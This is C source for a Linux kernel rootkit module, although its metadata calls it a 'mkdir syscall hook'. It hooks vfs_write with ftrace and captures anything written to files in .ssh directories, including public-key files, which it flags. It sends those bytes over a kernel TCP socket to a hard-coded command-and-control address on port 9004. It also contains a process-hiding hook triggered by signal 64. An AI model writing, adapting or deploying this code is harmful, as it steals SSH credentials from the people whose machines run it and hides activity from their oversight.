#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/file.h>
#include <linux/types.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/inet.h>
#include <linux/in.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");


char hide_pid[NAME_MAX];
char cncIpAddress[16] = "192.168.1.183";
struct socket *cncSocket;
struct msghdr msg;

struct rootkitMessage {
  uint8_t index;
};



// static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
static asmlinkage long (*orig_write)(const struct pt_regs *);
static asmlinkage ssize_t (*orig_vfs)(struct file *file, const char __user *buf, size_t count, loff_t *pos);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);

// asmlinkage int hook_mkdir(const struct pt_regs *regs)
// {
//     char __user *pathname = (char *)regs->di;
//     char dir_name[NAME_MAX] = {0};

//     long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

//     if (error > 0)
//         printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);

//     orig_mkdir(regs);
//     return 0;
// }


// asmlinkage long hook_write(const struct pt_regs *regs)
// {
//     long ret;
//     int fd = regs->di;
//     // char __user *buf = regs->si;
//     // size_t count = regs->dx;

//     // struct fd filed = fdget_pos(fd);

//     // char filename[NAME_MAX];
    
//     // strcpy(filename,filed.file->f_path.dentry->d_name.name);

    

//     // printk(KERN_INFO "rootkit: trying to write to a file %s", filename);

//     ret = orig_write(regs);
//     return ret;
// }

asmlinkage ssize_t vfs_h_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
{
    char filename[NAME_MAX];
    char directory[NAME_MAX];

    char buffer[count];

//    FILE *fptr;

    strcpy(filename, file->f_path.dentry->d_name.name);
    strcpy(directory, file->f_path.dentry->d_parent->d_name.name);

    if(strcmp(".ssh", directory) == 0)
    {
        printk(KERN_INFO "rootkit: trying to write to a file %s", file->f_path.dentry->d_name.name);
        printk(KERN_INFO "rootkit: bytes being written %s", buf);

	int sendErr;
	uint8_t whichFile = 0;

	char* truncateStr = strrchr(filename,'.');
	if (truncateStr != NULL){
	   if (strcmp(truncateStr, ".pub") == 0){
	      whichFile = 1;
	   }
	}
	printk("COUNT:%d\n", count);

	struct rootkitMessage rtkMsg;
    	rtkMsg.index = whichFile;
        
	struct kvec vecInit;
	vecInit.iov_base = &rtkMsg;
	vecInit.iov_len = 1;

	//sendErr = kernel_sendmsg(cncSocket, &msg, &vecInit, 1, 1);
        //printk("Init Message Sent: %d\n", sendErr);

	struct kvec vecData;
	vecData.iov_base = buf;
	vecData.iov_len = count;

	sendErr = kernel_sendmsg(cncSocket, &msg, &vecData, count, count);

	char *newLine = "\n";
	
	struct kvec vecNewLine;
	vecNewLine.iov_base = newLine;
	vecNewLine.iov_len = 2;

	sendErr = kernel_sendmsg(cncSocket, &msg, &vecNewLine, 2, 2);
	printk("Data Message Sent: %d\n", sendErr);

      //  fprt = fopen("test.txt","w");
      //  fprintf(fptr,"%s", buf);
    }




    
    
    return orig_vfs(file, buf, count, pos);
}


asmlinkage int hook_kill(const struct pt_regs *regs)
{
    /*
     * Pull out the arguments we need from the pt_regs struct
     */
    pid_t pid = regs->di;
    int sig = regs->si;

    /*
     * If the signal is 64, then print a message to the kernel buffer and
     * write the PID as a string to hide_pid
     */
    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d%", pid);
        return 0;
    }

    /*
     * Otherwise, just return the real sys_kill
     */
    return orig_kill(regs);
}


static struct ftrace_hook hooks[] = {
    // HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    //HOOK("__x64_sys_write", hook_write, &orig_write),
    HOOK("vfs_write", vfs_h_write, &orig_vfs),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    struct sockaddr_in cncAddress;
    memset(&cncAddress, 0, sizeof(cncAddress));
    cncAddress.sin_family = AF_INET;
    cncAddress.sin_port = htons(9004);
    cncAddress.sin_addr.s_addr = in_aton(cncIpAddress);

    memset(&msg, 0x00, sizeof(msg));
    msg.msg_name=(struct sockaddr_in*) &cncAddress;
    msg.msg_namelen=sizeof(cncAddress);
    msg.msg_flags = MSG_DONTWAIT | MSG_NOSIGNAL;

    //Create a socket
    int socketErr = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &cncSocket);
    if (socketErr < 0){
    	printk("Socket creation failed");
    }
    else{
	printk("Socket Bound Correctly, Socket Number:%d\n", socketErr);
    }

    int ret = cncSocket->ops->connect(cncSocket, (struct sockaddr *) &cncAddress, sizeof(cncAddress), O_RDWR);
    if (ret < 0){
       printk("Socket Connection Ret:%d\n", ret);
    }

    //list_del(&THIS_MODULE->list);

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    //Send End Message
    //int endMsgErr;
    //struct rootkitMessage rtkEndMsg;
    //rtkEndMsg.index = -1;
    //rtkEndMsg.length = cpu_to_be64(-1);

    //struct kvec vecEnd;
    //vecEnd.iov_base = &rtkEndMsg;
    //vecEnd.iov_len = 9;

    //endMsgErr = kernel_sendmsg(cncSocket, &msg, &vecEnd, 9, 9);
    
    //printk("End Message Bytes: %d\n", endMsgErr);
    
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
